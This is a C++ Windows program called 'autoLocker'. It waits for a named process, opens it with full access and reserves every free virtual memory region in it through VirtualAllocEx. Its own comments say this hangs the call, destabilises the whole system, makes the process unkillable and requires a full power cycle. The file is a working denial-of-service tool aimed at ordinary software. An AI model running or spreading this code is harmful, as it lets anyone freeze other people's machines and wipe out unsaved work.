#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <tlhelp32.h>
#include <unistd.h>
#include <algorithm>

namespace pointer {
    template<typename T>
    T AlignTop(const void *anyPointer, size_t alignment) {
        union {
            const void *as_void;
            uintptr_t as_uintptr_t;
            T as_T;
        };

        as_void = anyPointer;
        const size_t mask = alignment - 1u;
        as_uintptr_t += mask;
        as_uintptr_t &= ~mask;

        return as_T;
    }


    template<typename T, typename U>
    T Offset(void *anyPointer, U howManyBytes) {
        union {
            void *as_void;
            char *as_char;
            T as_T;
        };

        as_void = anyPointer;
        as_char += howManyBytes;

        return as_T;
    }
}

bool IsProcessRunning(DWORD pid) {
    HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, pid);
    DWORD ret = WaitForSingleObject(process, 0);
    CloseHandle(process);
    return ret == WAIT_TIMEOUT;
}

void execTarget(DWORD processID) {

    printf("Target: %lu \n", processID);

    // open notepad process
    HANDLE proc = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, /* PROCESSID */ processID);

    const size_t alignment = 64u * 1024u;

    // chosen to make the loop "overflow", starting from 0x0 again.
    // this will reserve every possible memory region in the target process.
    // once everything has been reserved, the call to ::VirtualAllocEx will hang and never return.
    // this creates instability across the whole Windows system, making it impossible to kill this process, or sometimes even start new processes.
    // Rebooting no longer works.
    // Debugging this process doesn't work.
    // A full power cycle is required!
    const void *addressStart = (const void *) 0x00007FFF7FF00000;
    const void *addressEnd = (const void *) 0x000080007FF00000;
    for (const void *address = addressStart; address < addressEnd; /* nothing */) {
        // align address to be scanned
        address = pointer::AlignTop<const void *>(address, alignment);

        ::MEMORY_BASIC_INFORMATION memoryInfo = {};
        const size_t bytesReturned = ::VirtualQueryEx(proc, address, &memoryInfo, sizeof(::MEMORY_BASIC_INFORMATION));

        // we are only interested in free pages
        if ((bytesReturned > 0u) && (memoryInfo.State == MEM_FREE)) {
            const size_t bytesLeft = abs((intptr_t *) addressEnd - (intptr_t *) memoryInfo.BaseAddress);
            const size_t size = std::min<size_t>(memoryInfo.RegionSize, bytesLeft);

            printf("[%lu] baseAddress: 0x%p, size: 0x%llX\n", processID, memoryInfo.BaseAddress, size);
            void *baseAddress = ::VirtualAllocEx(proc, memoryInfo.BaseAddress, size, MEM_RESERVE, PAGE_NOACCESS);
            if (baseAddress) {
                printf("[%lu] Reserving virtual memory region at 0x%p with size 0x%llX\n", processID, baseAddress,
                       size);
                ::VirtualAllocEx(proc, memoryInfo.BaseAddress, size, MEM_RESERVE, PAGE_NOACCESS);
            }
        }

        // keep on searching
        address = pointer::Offset<const void *>(memoryInfo.BaseAddress, memoryInfo.RegionSize);

        if (!IsProcessRunning(processID)) {
            printf("Target exited\n");
            break;
        }
    }

    ::CloseHandle(proc);
}

int findProcess(const char *processName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 entry;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    entry.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &entry);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(processName, entry.szExeFile) == 0) {
            pid = entry.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &entry);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    if (argc == 1) {
        printf("You must provide a valid process name!\n");
        exit(1);
    }
    const char *targetName = argv[1];
    printf("Starting autoLocker...\n");
    printf("Target: %s\n", targetName);

    while (true) {
        int pid = findProcess(targetName);
        if (pid != 0) {
            printf("Target found. PID: %i\n", pid);
            execTarget(pid);
        } else {
            printf("Still waiting...\n");
        }
        sleep(5);
    }

    return 0;
}
